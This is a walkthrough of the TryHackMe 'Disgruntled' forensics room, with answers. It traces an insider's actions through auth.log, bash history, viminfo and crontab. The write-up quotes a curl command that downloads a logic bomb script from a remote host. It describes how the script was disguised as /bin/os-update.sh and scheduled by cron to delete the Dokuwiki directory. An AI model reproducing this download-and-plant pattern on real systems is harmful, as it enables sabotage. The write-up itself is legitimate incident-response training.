Disgruntled (THM)

Scenario

Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

https://tryhackme.com/room/disgruntled

1- The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

/usr/bin/apt install dokuwiki

To identify the full command executed with elevated privileges, we need to review the sudo execution history recorded in the authentication logs. These logs are stored in /var/log/auth.log. By filtering the log for entries containing the keyword COMMAND cat /var/log/auth.log | grep -i "COMMAND"

2- What was the present working directory (PWD) when the previous command was run?

/home/cybert

From the logs, we can observe that most commands were executed from the home directory of the cybert user. This indicates that the present working directory (PWD) at the time of running the command was the user’s home directory /home/cybert

3-Which user was created after the package from the previous task was installed?

it-admin

Check /var/log/auth.log for adduser entries to see which user was created cat /var/log/auth.log | grep -i "adduser"

4- A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

Dec 28 06:27:34

The logs show that visudo was used to edit the /etc/sudoers file, granting the it-admin user sudo privileges. To confirm the exact time of the change, we can correlate the log entry with the file metadata using:

stat /etc/sudoers

The Modify and Change timestamps align with the log entry, indicating the sudoers file was updated on:

Dec 28 06:27:34

5- A script file was opened using the "vi" text editor. What is the name of this file?

bomb.sh

The logs show that the it-admin user used vi to open and edit the bomb.sh file. By checking /var/log/auth.log for entries containing vi, we can confirm the filename.

6- What is the command used that created the file bomb.sh?

curl 10.10.158.38:8080/bomb.sh --output bomb.sh

The it-admin user executed the command curl 10.10.158.38:8080/bomb.sh --output bomb.sh to create the bomb.sh file. Since the file was later removed from the user’s home directory, it does not appear there. Reviewing the .bash_history in /home/it-admin confirms that the file was fetched from a remote server using curl rather than being created locally.

7- The file was renamed and moved to a different directory. What is the full path of this file now?

/bin/os-update.sh

Since the it-admin user used vi to edit the file, we can check the .viminfo file for command history. This shows that the file was renamed and moved, and its full path is now /bin/os-update.sh.

8- When was the file from the previous question last modified? (Format: Month Day HH:MM)

Dec 28 06:29

The stat command provides detailed information about a file, including access, modify, and change timestamps. Using stat on /bin/os-update.sh shows that the file was last modified on Dec 28 06:29.

9- What is the name of the file that will get created when the file from the first question executes?

goodbye.txt

Inspecting the bomb.sh file reveals that it is a logic bomb. If the it-admin user hasn’t logged in within the last 90 days, it deletes the Dokuwiki installation directory and creates a file named goodbye.txt with a taunting message.

10- At what time will the malicious file trigger? (Format: HH:MM AM/PM)

08:00 AM

https://crontab.guru/ The it-admin user edited /etc/crontab using nano, which manages the system’s global cron jobs. Inspecting the file shows that the logic bomb (bomb.sh) is scheduled to run dailyat 08:00 AM.
